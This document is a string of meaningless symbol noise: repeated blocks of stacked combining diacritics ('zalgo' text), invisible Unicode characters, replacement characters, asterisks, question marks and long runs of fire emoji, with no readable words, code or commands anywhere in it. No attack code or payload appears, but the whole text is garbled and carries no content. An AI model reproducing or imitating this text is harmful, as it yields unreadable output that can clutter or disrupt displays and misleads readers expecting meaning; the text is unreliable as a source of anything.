̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̐